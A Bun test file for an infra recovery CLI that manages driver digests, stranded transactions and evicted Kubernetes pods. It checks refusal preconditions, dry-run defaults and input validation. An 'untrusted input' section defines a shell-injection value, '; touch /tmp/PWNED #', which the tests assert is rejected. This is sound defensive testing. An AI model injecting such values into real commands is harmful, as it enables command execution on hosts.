/**
 * bun test orchestrator/infra.test.mjs
 *
 * WM-1105. The three legal-dev recovery verbs, driven entirely by fake adapter
 * output — no ssh, no cluster, no gh. What is under test is the refusal
 * surface: every precondition that exists because a real incident showed what
 * happens without it.
 *
 * Covers:
 *  - rotate-driver-digest: binary mismatch, config mismatch, malformed digest,
 *    already-current skip, before/after reporting, and "no gh write on refuse"
 *  - discard-unprepared-transaction: promotion.state present, coordinator.phase
 *    present, resourceVersion moved, missing test precondition, missing
 *    binding, absent directory, and the probe/act re-assertion race (exit 9)
 *  - sweep-evicted-pods: owner with a Running replica selected, owner without
 *    one skipped, ownerless pods gated on age, Running/Pending/Succeeded never
 *    selected, namespace filtering, every-delete-failed
 *  - dry run is the default for all three: zero mutating adapter calls
 *  - "untrusted input" (below): every operator flag and every host-read value
 *    that reaches ssh's argv or the runner's shell, one test per way the cold
 *    review of WM-1105 got a string through
 */
import { test, expect, describe } from "bun:test";
import { spawnSync } from "node:child_process";
import {
  chmodSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import {
  EXIT,
  ROLES,
  DRIVER_PATH,
  DRIVER_CONFIG,
  DEFAULT_NAMESPACES,
  DRIVER_DIGEST_REPOS,
  DISCARD_POINT_OF_NO_RETURN,
  ORPHAN_MIN_AGE_MS,
  HOST_RE,
  evaluateDigestRotation,
  evaluateDiscard,
  patchResourceVersionPrecondition,
  resolveDriverDigestRepo,
  selectEvictedPods,
  namespaceMatches,
  splitList,
  parseArgs,
  parseDigestProbe,
  logStamp,
  makeLogger,
  defaultSsh,
  discardActScript,
  rotateDriverDigest,
  discardUnpreparedTransaction,
  sweepEvictedPods,
  runCli,
} from "./infra.mjs";

const DIGEST = `sha256:${"b".repeat(64)}`;
const OTHER = `sha256:${"c".repeat(64)}`;

const ok = (stdout = "") => ({ status: 0, stdout, stderr: "" });
const fail = (stderr = "boom", status = 1) => ({ status, stdout: "", stderr });

/** Records every adapter call so a dry run can be asserted to make none. */
function recorder(handler) {
  const calls = [];
  const fn = (...args) => {
    calls.push(args);
    return handler(...args);
  };
  fn.calls = calls;
  return fn;
}

const silent = () => ({ out: () => {}, err: () => {} });

function capture() {
  const lines = [];
  return {
    lines,
    out: (...a) => lines.push(a.join(" ")),
    err: (...a) => lines.push(a.join(" ")),
    text: () => lines.join("\n"),
  };
}

const digestProbeOut = (binary, config) =>
  `binary\t${binary}\nconfig\t${config}\n`;

// ---------------------------------------------------------------------------

describe("small pure helpers", () => {
  test("splitList trims and drops empties", () => {
    expect(splitList(" legalease , lawz ,, ")).toEqual(["legalease", "lawz"]);
    expect(splitList(undefined)).toEqual([]);
  });

  test("namespaceMatches treats * as the only metacharacter", () => {
    const patterns = splitList(DEFAULT_NAMESPACES);
    expect(namespaceMatches("office-04398940ae10", patterns)).toBe(true);
    expect(namespaceMatches("legal-research-dev", patterns)).toBe(true);
    expect(namespaceMatches("legalease-pii", patterns)).toBe(true);
    expect(namespaceMatches("buzz-agents", patterns)).toBe(false);
    expect(namespaceMatches("kube-system", patterns)).toBe(false);
    // A dot in a pattern is literal, not "any character".
    expect(namespaceMatches("officeXpii", ["office.pii"])).toBe(false);
  });

  test("parseArgs handles --k v, --k=v and bare flags", () => {
    expect(
      parseArgs(["sweep-evicted-pods", "--yes", "--namespaces", "a,b"]),
    ).toEqual({
      verb: "sweep-evicted-pods",
      flags: { yes: true, namespaces: "a,b" },
    });
    expect(parseArgs(["rotate-driver-digest", "--digest=sha256:x"])).toEqual({
      verb: "rotate-driver-digest",
      flags: { digest: "sha256:x" },
    });
  });

  test("parseDigestProbe reads the two tab-separated lines", () => {
    expect(parseDigestProbe(digestProbeOut(DIGEST, OTHER))).toEqual({
      binaryDigest: DIGEST,
      configDigest: OTHER,
    });
    expect(parseDigestProbe("")).toEqual({
      binaryDigest: null,
      configDigest: null,
    });
  });

  test("logStamp is YYYYMMDD-HHMMSS in local time", () => {
    expect(logStamp(new Date(2026, 8, 15, 4, 5, 6).getTime())).toBe(
      "20260915-040506",
    );
  });

  test("makeLogger writes to ~/.factory/logs/infra-shaped path and never throws", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "infra-log-"));
    const logger = makeLogger("sweep-evicted-pods", {
      nowMs: new Date(2026, 8, 15, 4, 5, 6).getTime(),
      logDir: dir,
    });
    logger.write("hello");
    expect(path.basename(logger.file)).toBe(
      "sweep-evicted-pods-20260915-040506.log",
    );
    expect(readFileSync(logger.file, "utf8")).toContain("hello");
    // An unusable log directory degrades to a no-op rather than killing a
    // recovery: here the "directory" is actually a regular file.
    const blocker = path.join(dir, "not-a-dir");
    writeFileSync(blocker, "");
    const broken = makeLogger("x", { logDir: path.join(blocker, "nested") });
    expect(() => broken.write("still fine")).not.toThrow();
  });
});

// ---------------------------------------------------------------------------

describe("evaluateDigestRotation", () => {
  test("accepts a digest that both the binary and the config agree on", () => {
    const v = evaluateDigestRotation({
      digest: DIGEST,
      binaryDigest: DIGEST,
      configDigest: DIGEST,
    });
    expect(v.ok).toBe(true);
    expect(v.exitCode).toBe(EXIT.OK);
  });

  test("refuses when the installed binary hashes to something else", () => {
    const v = evaluateDigestRotation({
      digest: DIGEST,
      binaryDigest: OTHER,
      configDigest: DIGEST,
    });
    expect(v.ok).toBe(false);
    expect(v.exitCode).toBe(EXIT.REFUSED);
    expect(v.reason).toContain(DRIVER_PATH);
  });

  test("refuses when config.json records a different driver_sha256", () => {
    const v = evaluateDigestRotation({
      digest: DIGEST,
      binaryDigest: DIGEST,
      configDigest: OTHER,
    });
    expect(v.exitCode).toBe(EXIT.REFUSED);
    expect(v.reason).toContain(DRIVER_CONFIG);
  });

  test("an unreadable probe value is a mismatch, not a pass", () => {
    const v = evaluateDigestRotation({
      digest: DIGEST,
      binaryDigest: null,
      configDigest: null,
    });
    expect(v.exitCode).toBe(EXIT.REFUSED);
    expect(v.mismatches).toHaveLength(2);
  });

  test("a malformed --digest cannot be evaluated at all", () => {
    for (const bad of [undefined, "", "deadbeef", `sha256:${"z".repeat(64)}`]) {
      expect(evaluateDigestRotation({ digest: bad }).exitCode).toBe(
        EXIT.CANNOT_EVALUATE,
      );
    }
  });
});

describe("rotate-driver-digest", () => {
  const probeSsh = (binary, config) =>
    recorder(() => ok(digestProbeOut(binary, config)));

  test("refusing writes nothing: zero `gh variable set` calls", () => {
    const gh = recorder(() => ok(OTHER));
    const cap = capture();
    const result = rotateDriverDigest(
      { digest: DIGEST, repos: ["legalease", "lawz"], yes: true },
      { ssh: probeSsh(OTHER, OTHER), gh, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.REFUSED);
    expect(result.actions).toBe(0);
    expect(gh.calls).toHaveLength(0);
    expect(cap.text()).toContain("no repository variable was changed");
  });

  test("dry run reports before -> after but never calls `variable set`", () => {
    const gh = recorder((args) => (args[1] === "get" ? ok(OTHER) : ok()));
    const cap = capture();
    const result = rotateDriverDigest(
      { digest: DIGEST, repos: ["legalease", "lawz"] },
      { ssh: probeSsh(DIGEST, DIGEST), gh, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    expect(result.actions).toBe(0);
    expect(gh.calls.every((c) => c[0][1] === "get")).toBe(true);
    expect(cap.text()).toContain(`watt-mind/legalease: ${OTHER} -> ${DIGEST}`);
    expect(cap.text()).toContain("[dry run — pass --yes to apply]");
  });

  test("--yes sets the variable in each repo and prints the read-back", () => {
    let current = OTHER;
    const gh = recorder((args) => {
      if (args[1] === "get") return ok(current);
      current = args[args.length - 1];
      return ok();
    });
    const cap = capture();
    const result = rotateDriverDigest(
      { digest: DIGEST, repos: ["legalease", "lawz"], yes: true },
      { ssh: probeSsh(DIGEST, DIGEST), gh, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    // legalease is written; lawz is then already current and skipped.
    expect(result.actions).toBe(1);
    expect(cap.text()).toContain(`watt-mind/legalease: ${OTHER} -> ${DIGEST}`);
    expect(cap.text()).toContain("already current, skipped");
  });

  test("an unset variable reads as (unset) rather than blank", () => {
    const gh = recorder((args) =>
      args[1] === "get" ? fail("not found") : ok(),
    );
    const cap = capture();
    rotateDriverDigest(
      { digest: DIGEST, repos: ["lawz"] },
      { ssh: probeSsh(DIGEST, DIGEST), gh, ...cap },
    );
    expect(cap.text()).toContain(`watt-mind/lawz: (unset) -> ${DIGEST}`);
  });

  test("a failed ssh probe is CANNOT EVALUATE, not a clean run", () => {
    const gh = recorder(() => ok());
    const result = rotateDriverDigest(
      { digest: DIGEST, repos: ["lawz"], yes: true },
      { ssh: recorder(() => fail("Permission denied")), gh, ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(gh.calls).toHaveLength(0);
  });

  test("missing --repos cannot be evaluated and never touches the host", () => {
    const ssh = recorder(() => ok());
    const result = rotateDriverDigest(
      { digest: DIGEST, repos: [] },
      { ssh, gh: recorder(() => ok()), ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------

describe("patchResourceVersionPrecondition", () => {
  test("reads the leading JSON Patch test op", () => {
    expect(
      patchResourceVersionPrecondition([
        { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
        { op: "replace", path: "/spec/template", value: {} },
      ]),
    ).toBe("4547129");
  });

  test("a patch without that op yields null, not a pass", () => {
    expect(patchResourceVersionPrecondition([{ op: "replace" }])).toBe(null);
    expect(patchResourceVersionPrecondition(null)).toBe(null);
    expect(patchResourceVersionPrecondition("not a patch")).toBe(null);
  });
});

describe("evaluateDiscard", () => {
  const base = {
    dirExists: true,
    promotionState: false,
    coordinatorPhase: false,
    patch: [
      { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
    ],
    target: "legal-research-dev/legal-research-broker",
    liveResourceVersion: "4547129",
    binding: `sha256:${"a".repeat(64)}`,
  };

  test("an unprepared transaction whose deployment has not moved is discardable", () => {
    const v = evaluateDiscard({ role: "research-runner", probe: base });
    expect(v.ok).toBe(true);
    expect(v.binding).toBe(base.binding);
    expect(v.resourceVersion).toBe("4547129");
  });

  test("promotion.state present -> REFUSED", () => {
    const v = evaluateDiscard({
      role: "research-runner",
      probe: { ...base, promotionState: true },
    });
    expect(v.exitCode).toBe(EXIT.REFUSED);
    expect(v.reason).toContain("promotion.state");
  });

  test("coordinator.phase present -> REFUSED", () => {
    const v = evaluateDiscard({
      role: "case-agent",
      probe: { ...base, coordinatorPhase: true },
    });
    expect(v.exitCode).toBe(EXIT.REFUSED);
    expect(v.reason).toContain("coordinator.phase");
  });

  test("resourceVersion moved -> REFUSED (something was applied)", () => {
    const v = evaluateDiscard({
      role: "research-runner",
      probe: { ...base, liveResourceVersion: "4562290" },
    });
    expect(v.exitCode).toBe(EXIT.REFUSED);
    expect(v.reason).toContain("4547129");
    expect(v.reason).toContain("4562290");
  });

  test("an unreadable live resourceVersion is CANNOT EVALUATE, not a pass", () => {
    const v = evaluateDiscard({
      role: "research-runner",
      probe: { ...base, liveResourceVersion: null },
    });
    expect(v.exitCode).toBe(EXIT.CANNOT_EVALUATE);
  });

  test("a patch with no test precondition is CANNOT EVALUATE", () => {
    const v = evaluateDiscard({
      role: "research-runner",
      probe: { ...base, patch: [{ op: "replace", path: "/spec" }] },
    });
    expect(v.exitCode).toBe(EXIT.CANNOT_EVALUATE);
  });

  test("a missing binding is CANNOT EVALUATE — nothing to --recover", () => {
    const v = evaluateDiscard({
      role: "research-runner",
      probe: { ...base, binding: null },
    });
    expect(v.exitCode).toBe(EXIT.CANNOT_EVALUATE);
  });

  test("no directory at all is a clean no-op", () => {
    const v = evaluateDiscard({
      role: "case-agent",
      probe: { dirExists: false },
    });
    expect(v.ok).toBe(true);
    expect(v.nothingToDo).toBe(true);
  });

  test("an unknown role cannot be evaluated", () => {
    for (const role of [null, "broker", "research_runner"]) {
      expect(evaluateDiscard({ role, probe: base }).exitCode).toBe(
        EXIT.CANNOT_EVALUATE,
      );
    }
    expect(ROLES).toEqual(["research-runner", "case-agent"]);
  });
});

describe("discard-unprepared-transaction", () => {
  const probePayload = (over = {}) =>
    JSON.stringify({
      dirExists: true,
      promotionState: false,
      coordinatorPhase: false,
      patch: [
        { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
      ],
      target: {
        namespace: "legal-research-dev",
        name: "legal-research-broker",
      },
      binding: `sha256:${"a".repeat(64)}`,
      entries: ["deployment-patch.json", "qualification-stage.binding"],
      exchange: ["publisher-research_runner-candidate.json"],
      ...over,
    });

  test("refuses a prepared transaction without a second ssh", () => {
    const ssh = recorder(() => ok(probePayload({ promotionState: true })));
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.REFUSED);
    // One call: the probe. The act script was never sent.
    expect(ssh.calls).toHaveLength(1);
  });

  test("refuses when the live deployment moved past the patch precondition", () => {
    const ssh = recorder(() => ok(probePayload()));
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4562290", ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.REFUSED);
    expect(ssh.calls).toHaveLength(1);
  });

  test("dry run prints the plan and sends no act script", () => {
    const ssh = recorder(() => ok(probePayload()));
    const cap = capture();
    const result = discardUnpreparedTransaction(
      { role: "research-runner" },
      { ssh, deploymentResourceVersion: () => "4547129", ...cap },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    expect(result.actions).toBe(0);
    expect(ssh.calls).toHaveLength(1);
    expect(cap.text()).toContain("--recover");
    expect(cap.text()).toContain("publisher-research_runner-candidate.json");
    expect(cap.text()).toContain("[dry run — pass --yes to apply]");
  });

  test("--yes sends an act script that re-asserts both state files", () => {
    const scripts = [];
    const ssh = recorder((host, script) => {
      scripts.push(script);
      return scripts.length === 1
        ? ok(probePayload())
        : ok("== journal tail\n");
    });
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    expect(result.actions).toBe(1);
    expect(scripts).toHaveLength(2);
    expect(scripts[1]).toContain("flock -w 30 -x 9");
    expect(scripts[1]).toContain('[ -e "$DIR/promotion.state" ]');
    expect(scripts[1]).toContain('[ -e "$DIR/coordinator.phase" ]');
    expect(scripts[1]).toContain("--recover");
    expect(scripts[1]).toContain("rm -rf");
  });

  test("the act script re-reads the live resourceVersion under the re-taken lock, before the rm", () => {
    const scripts = [];
    const ssh = recorder((host, script) => {
      scripts.push(script);
      return scripts.length === 1
        ? ok(probePayload())
        : ok("== journal tail\n");
    });
    discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
    );
    const act = scripts[1];
    // The probe's lock is released before this script runs, and a deployment
    // can move without leaving a file behind, so the state-file re-assertions
    // alone left a window the size of an ssh round-trip.
    const check =
      "kubectl -n 'legal-research-dev' get deployment 'legal-research-broker' -o jsonpath='{.metadata.resourceVersion}'";
    expect(act).toContain(check);
    expect(act).toContain(`[ "$LIVE" = '4547129' ]`);
    expect(act.indexOf("flock -w 30 -x 9")).toBeLessThan(act.indexOf(check));
    expect(act.indexOf(check)).toBeLessThan(act.indexOf('rm -rf "$DIR"'));
    // A moved deployment is exit 9 (REFUSED); a re-check that could not be
    // made at all is exit 10, which the caller reads as CANNOT EVALUATE.
    expect(act).toContain("exit 10");
  });

  test("a deployment that moved between probe and act reports REFUSED", () => {
    let call = 0;
    const ssh = recorder(() => {
      call += 1;
      return call === 1
        ? ok(probePayload())
        : fail("deployment legal-research-dev/legal-research-broker moved", 9);
    });
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.REFUSED);
    expect(result.actions).toBe(0);
  });

  test("the act script losing the race (exit 9) reports REFUSED, not success", () => {
    let call = 0;
    const ssh = recorder(() => {
      call += 1;
      return call === 1
        ? ok(probePayload())
        : fail("coordinator.phase appeared", 9);
    });
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.REFUSED);
    expect(result.actions).toBe(0);
  });

  test("an empty active/<role> is reported as nothing stranded", () => {
    const ssh = recorder(() => ok(JSON.stringify({ dirExists: false })));
    const cap = capture();
    const result = discardUnpreparedTransaction(
      { role: "case-agent", yes: true },
      { ssh, deploymentResourceVersion: () => null, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    expect(result.actions).toBe(0);
    expect(cap.text()).toContain("nothing is stranded");
  });

  test("an unparseable probe is CANNOT EVALUATE", () => {
    const result = discardUnpreparedTransaction(
      { role: "case-agent", yes: true },
      { ssh: recorder(() => ok("not json")), ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
  });

  test("a bad role never reaches the host", () => {
    const ssh = recorder(() => ok());
    const result = discardUnpreparedTransaction(
      { role: "nope", yes: true },
      { ssh, ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------

const NOW = Date.parse("2026-09-15T10:00:00Z");
const hoursAgo = (h) => new Date(NOW - h * 3600_000).toISOString();

function pod({
  ns = "office-abc",
  name,
  phase = "Failed",
  reason = "Evicted",
  owners = null,
  age = 48,
}) {
  return {
    metadata: {
      namespace: ns,
      name,
      creationTimestamp: hoursAgo(age),
      ...(owners ? { ownerReferences: owners } : {}),
    },
    status: { phase, ...(reason ? { reason } : {}) },
  };
}

const rs = (uid, name = "rs-1") => [{ kind: "ReplicaSet", name, uid }];

describe("selectEvictedPods", () => {
  const patterns = splitList(DEFAULT_NAMESPACES);
  const select = (items) => selectEvictedPods(items, { patterns, nowMs: NOW });

  test("an evicted pod whose ReplicaSet has a Running replica is swept", () => {
    const { selected, skipped } = select([
      pod({ name: "worker-dead", owners: rs("uid-1") }),
      pod({
        name: "worker-live",
        phase: "Running",
        reason: null,
        owners: rs("uid-1"),
      }),
    ]);
    expect(selected.map((p) => p.name)).toEqual(["worker-dead"]);
    expect(skipped).toHaveLength(0);
  });

  test("an evicted pod whose owner has NO Running replica is skipped", () => {
    const { selected, skipped } = select([
      pod({ name: "only-husk", owners: rs("uid-2", "rs-lonely") }),
    ]);
    expect(selected).toHaveLength(0);
    expect(skipped[0].why).toContain("no Running replica");
    expect(skipped[0].why).toContain("rs-lonely");
  });

  test("a Running replica in a DIFFERENT namespace does not vouch for the husk", () => {
    const { selected } = select([
      pod({ ns: "office-abc", name: "husk", owners: rs("uid-3") }),
      pod({
        ns: "legalease-pii",
        name: "elsewhere",
        phase: "Running",
        reason: null,
        owners: rs("uid-3"),
      }),
    ]);
    expect(selected).toHaveLength(0);
  });

  test("ownerless fixture pods are gated on 24h", () => {
    const { selected, skipped } = select([
      pod({ name: "fixture-old", age: 30 }),
      pod({ name: "fixture-fresh", age: 3 }),
    ]);
    expect(selected.map((p) => p.name)).toEqual(["fixture-old"]);
    expect(skipped[0].name).toBe("fixture-fresh");
    expect(skipped[0].why).toContain("< 24h");
    expect(ORPHAN_MIN_AGE_MS).toBe(24 * 3600_000);
  });

  test("ContainerStatusUnknown counts; other Failed reasons do not", () => {
    const { selected, skipped } = select([
      pod({
        name: "unknown",
        reason: "ContainerStatusUnknown",
        owners: rs("u"),
      }),
      pod({ name: "oom", reason: "OOMKilled", owners: rs("u") }),
      pod({ name: "noreason", reason: null, owners: rs("u") }),
      pod({ name: "alive", phase: "Running", reason: null, owners: rs("u") }),
    ]);
    expect(selected.map((p) => p.name)).toEqual(["unknown"]);
    expect(skipped.map((p) => p.name).sort()).toEqual(["noreason", "oom"]);
  });

  test("Running, Pending and Succeeded pods are never selected or listed", () => {
    const { selected, skipped } = select([
      pod({ name: "r", phase: "Running", reason: null }),
      pod({ name: "p", phase: "Pending", reason: null }),
      pod({ name: "s", phase: "Succeeded", reason: null }),
      // Phase is the gate: a Running pod that somehow carries reason Evicted
      // is still Running and must be left alone.
      pod({ name: "weird", phase: "Running", reason: "Evicted" }),
    ]);
    expect(selected).toHaveLength(0);
    expect(skipped).toHaveLength(0);
  });

  test("namespaces outside the pattern set are not considered at all", () => {
    const { selected, skipped } = select([
      pod({ ns: "buzz-agents", name: "not-mine", owners: rs("u") }),
      pod({ ns: "kube-system", name: "also-not", owners: rs("u") }),
    ]);
    expect(selected).toHaveLength(0);
    expect(skipped).toHaveLength(0);
  });
});

describe("sweep-evicted-pods", () => {
  const podsJson = (items) => JSON.stringify({ items });

  test("dry run lists the plan and issues no delete", () => {
    const ssh = recorder(() => ok());
    const kubectlPods = recorder(() =>
      ok(
        podsJson([
          pod({ name: "husk", owners: rs("u") }),
          pod({
            name: "live",
            phase: "Running",
            reason: null,
            owners: rs("u"),
          }),
        ]),
      ),
    );
    const cap = capture();
    const result = sweepEvictedPods(
      {},
      { ssh, kubectlPods, now: () => NOW, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    expect(result.actions).toBe(0);
    expect(ssh.calls).toHaveLength(0);
    expect(cap.text()).toContain("DELETE office-abc/husk");
    expect(cap.text()).toContain("[dry run — pass --yes to delete]");
  });

  test("--yes deletes exactly the selected pods, one kubectl call each", () => {
    const ssh = recorder(() => ok("pod deleted"));
    const kubectlPods = recorder(() =>
      ok(
        podsJson([
          pod({ name: "husk-a", owners: rs("u") }),
          pod({ name: "husk-b", owners: rs("u") }),
          pod({ name: "lonely", owners: rs("other", "rs-lonely") }),
          pod({
            name: "live",
            phase: "Running",
            reason: null,
            owners: rs("u"),
          }),
        ]),
      ),
    );
    const result = sweepEvictedPods(
      { yes: true },
      { ssh, kubectlPods, now: () => NOW, ...silent() },
    );
    expect(result.actions).toBe(2);
    expect(ssh.calls).toHaveLength(2);
    const scripts = ssh.calls.map((c) => c[1]);
    expect(scripts[0]).toBe("kubectl delete pod -n 'office-abc' 'husk-a'\n");
    expect(scripts[1]).toBe("kubectl delete pod -n 'office-abc' 'husk-b'\n");
    expect(scripts.join("")).not.toContain("lonely");
    expect(scripts.join("")).not.toContain("live");
  });

  test("one failed delete does not abort the rest", () => {
    let n = 0;
    const ssh = recorder(() => {
      n += 1;
      return n === 1 ? fail("NotFound") : ok();
    });
    const kubectlPods = recorder(() =>
      ok(
        podsJson([
          pod({ name: "a", owners: rs("u") }),
          pod({ name: "b", owners: rs("u") }),
          pod({
            name: "live",
            phase: "Running",
            reason: null,
            owners: rs("u"),
          }),
        ]),
      ),
    );
    const result = sweepEvictedPods(
      { yes: true },
      { ssh, kubectlPods, now: () => NOW, ...silent() },
    );
    expect(result.actions).toBe(1);
    expect(ssh.calls).toHaveLength(2);
  });

  test("a failed kubectl list is CANNOT EVALUATE, never an empty sweep", () => {
    const result = sweepEvictedPods(
      { yes: true },
      {
        ssh: recorder(() => ok()),
        kubectlPods: recorder(() => fail("connection refused")),
        ...silent(),
      },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
  });

  test("unparseable kubectl JSON is CANNOT EVALUATE", () => {
    const result = sweepEvictedPods(
      {},
      {
        ssh: recorder(() => ok()),
        kubectlPods: recorder(() => ok("<html>proxy error</html>")),
        ...silent(),
      },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
  });

  test("an empty --namespaces refuses to sweep everything", () => {
    const kubectlPods = recorder(() => ok(podsJson([])));
    const result = sweepEvictedPods(
      { namespaces: " , " },
      { ssh: recorder(() => ok()), kubectlPods, ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(kubectlPods.calls).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------

describe("runCli", () => {
  const logDir = () => mkdtempSync(path.join(tmpdir(), "infra-cli-"));

  test("bare invocation prints usage and cannot be evaluated", () => {
    const cap = capture();
    expect(runCli([], { ...cap })).toBe(EXIT.CANNOT_EVALUATE);
    expect(cap.text()).toContain("factory infra <verb>");
  });

  test("an unknown verb is rejected", () => {
    const cap = capture();
    expect(runCli(["delete-everything"], { ...cap })).toBe(
      EXIT.CANNOT_EVALUATE,
    );
    expect(cap.text()).toContain("unknown verb");
  });

  test("--help on a real verb exits 0", () => {
    const cap = capture();
    expect(runCli(["sweep-evicted-pods", "--help"], { ...cap })).toBe(EXIT.OK);
  });

  test("the verb's output is teed to ~/.factory/logs/infra/<verb>-<stamp>.log", () => {
    const dir = logDir();
    const cap = capture();
    const code = runCli(["sweep-evicted-pods", "--namespaces", "office-*"], {
      ...cap,
      logDir: dir,
      ssh: recorder(() => ok()),
      kubectlPods: recorder(() =>
        ok(
          JSON.stringify({
            items: [
              pod({ name: "husk", owners: rs("u") }),
              pod({
                name: "live",
                phase: "Running",
                reason: null,
                owners: rs("u"),
              }),
            ],
          }),
        ),
      ),
      now: () => NOW,
    });
    expect(code).toBe(EXIT.OK);
    const files = readdirSync(dir);
    expect(files).toHaveLength(1);
    expect(files[0]).toMatch(/^sweep-evicted-pods-\d{8}-\d{6}\.log$/);
    const log = readFileSync(path.join(dir, files[0]), "utf8");
    expect(log).toContain("DELETE office-abc/husk");
    expect(log).toContain("dry run");
  });

  test("--ticket posts exactly one line, and only when asked", () => {
    const comment = recorder(() => ok());
    const deps = {
      ...silent(),
      logDir: logDir(),
      comment,
      ssh: recorder(() => ok()),
      kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
      now: () => NOW,
    };
    runCli(["sweep-evicted-pods"], deps);
    expect(comment.calls).toHaveLength(0);

    runCli(
      ["sweep-evicted-pods", "--ticket", "WM-1105", "--ticket-repo", "wm-home"],
      deps,
    );
    expect(comment.calls).toHaveLength(1);
    const [ticket, body, opts] = comment.calls[0];
    expect(ticket).toBe("WM-1105");
    expect(body).toContain("factory infra sweep-evicted-pods");
    expect(body).toContain("dry run — nothing changed");
    expect(body.split("\n")).toHaveLength(1);
    expect(opts.repo).toBe("wm-home");
  });

  test("a REFUSED verb propagates exit 2 through the CLI", () => {
    const code = runCli(
      ["rotate-driver-digest", "--digest", DIGEST, "--repos", "lawz"],
      {
        ...silent(),
        logDir: logDir(),
        ssh: recorder(() => ok(digestProbeOut(OTHER, OTHER))),
        gh: recorder(() => ok()),
        now: () => NOW,
      },
    );
    expect(code).toBe(EXIT.REFUSED);
  });

  test("--dry-run is accepted and is exactly the default", () => {
    const gh = recorder((args) => (args[1] === "get" ? ok(OTHER) : ok()));
    const code = runCli(
      [
        "rotate-driver-digest",
        "--digest",
        DIGEST,
        "--repos",
        "lawz",
        "--dry-run",
      ],
      {
        ...silent(),
        logDir: logDir(),
        ssh: recorder(() => ok(digestProbeOut(DIGEST, DIGEST))),
        gh,
        now: () => NOW,
      },
    );
    expect(code).toBe(EXIT.OK);
    expect(gh.calls.every((c) => c[0][1] === "get")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Untrusted input.
//
// Everything below is a value that ends up in ssh's argv or in a script that
// runs as root on the runner. The cold review of WM-1105 got `; touch
// /tmp/PWNED #` all the way onto that shell through `--candidate-role`, so each
// of these asserts the same two things: the refusal is exit 3, and the string
// never reached an adapter.
// ---------------------------------------------------------------------------

const INJECTION = "; touch /tmp/PWNED #";

describe("--candidate-role never reaches the runner's shell", () => {
  const cliDeps = (extra = {}) => ({
    ...silent(),
    logDir: mkdtempSync(path.join(tmpdir(), "infra-inj-")),
    now: () => NOW,
    ...extra,
  });

  test("an injected --candidate-role is exit 3 and never opens an ssh", () => {
    const ssh = recorder(() => ok());
    const code = runCli(
      [
        "discard-unprepared-transaction",
        "--role",
        "research-runner",
        "--candidate-role",
        INJECTION,
        "--yes",
      ],
      cliDeps({ ssh, deploymentResourceVersion: () => "4547129" }),
    );
    expect(code).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
  });

  test("the verb refuses the same value when called directly", () => {
    const ssh = recorder(() => ok());
    const cap = capture();
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true, candidateRole: INJECTION },
      { ssh, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
    expect(cap.text()).toContain("--candidate-role");
  });

  test("and the script builder itself refuses to interpolate it", () => {
    const args = {
      binding: `sha256:${"a".repeat(64)}`,
      candidateRole: "research_runner",
      target: {
        namespace: "legal-research-dev",
        name: "legal-research-broker",
      },
      resourceVersion: "4547129",
    };
    expect(() => discardActScript("research-runner", args)).not.toThrow();
    expect(() =>
      discardActScript("research-runner", {
        ...args,
        candidateRole: INJECTION,
      }),
    ).toThrow(/candidate role/);
    // A legitimate value is single-quoted rather than bare, so the quoting and
    // the shape check each stand on their own.
    const script = discardActScript("research-runner", args);
    expect(script).toContain(
      "rm -f '/var/lib/legalease/dev-qualification/exchange/publisher-research_runner-candidate.json'",
    );
  });

  test("a bare --candidate-role flag is not a role", () => {
    const ssh = recorder(() => ok());
    expect(
      runCli(
        [
          "discard-unprepared-transaction",
          "--role",
          "research-runner",
          "--candidate-role",
          "--yes",
        ],
        cliDeps({ ssh }),
      ),
    ).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
  });
});

describe("--yes --dry-run is contradictory, not permissive", () => {
  const injected = (verb) => {
    const ssh = recorder(() => ok());
    const gh = recorder(() => ok());
    const kubectlPods = recorder(() => ok(JSON.stringify({ items: [] })));
    const argv = {
      "rotate-driver-digest": [
        "rotate-driver-digest",
